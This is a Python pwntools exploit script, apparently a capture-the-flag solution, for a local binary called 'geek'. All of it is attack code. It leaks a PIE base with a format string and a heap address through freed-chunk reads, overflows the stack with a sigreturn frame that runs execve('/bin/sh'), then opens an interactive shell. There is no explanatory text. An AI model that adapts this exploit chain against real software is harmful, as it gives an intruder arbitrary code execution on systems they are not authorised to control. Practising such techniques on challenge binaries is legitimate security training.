from pwn import *

r=process("./geek")
#gdb.attach(r)
#pause()
#0xe90
fmt="%12$p"

context.clear()
context.arch = "amd64"

read_plt=0x00000000000008D0
syscall_ret=0x000000000000A44
offset=24
def commit(content):
    r.sendline("1")
    r.recvuntil(":\n")
    r.sendline(content)
    r.recvuntil("$ ")

def free(id):
    r.sendline("3")
    r.recvuntil("?\n")
    r.sendline(str(id))
    r.recvuntil("$ ")


r.recvuntil("$ ")
commit(fmt)

#leak offset
r.sendline("2")
r.recvuntil("?")
r.sendline("0")
leak=r.recvuntil("1.")
leak=leak[:-2]
#print "leaked addr : "+leak
leak=int(leak,16)
base=leak-0xe90
print hex(leak)

for i in range(10):
    commit("A"*8)

free(1)
free(3)
r.sendline("2")
r.recvuntil("?")
r.sendline("3")
leak=r.recvuntil("1.")
leak=leak[1:-2]
print leak
leakheap=u64(leak.ljust(8,"\x00"))
print "leaked heap : "+hex(leakheap)
heap_region=leakheap-0x50
sc_addr=leakheap+0x10

commit("pppppppp")
commit("/bin/sh\x00")

sleep(0.2)# add to make the exploit more stable

payload="A"*(offset-8)+p64(heap_region+0x20)+p64(base+read_plt)+p64(base+syscall_ret)

frame=SigreturnFrame()
frame.rax=59
frame.rdi=sc_addr
frame.rsi=0
frame.rdx=0
frame.rip=base+syscall_ret
frame.rbp=heap_region+0x200
frame.rsp=heap_region+0x200

payload+=str(frame)

r.sendline(str(5))
sleep(0.1)

r.sendline(payload)
sleep(2)
r.sendline("A"*14)
r.sendline("ls -al")
r.interactive()
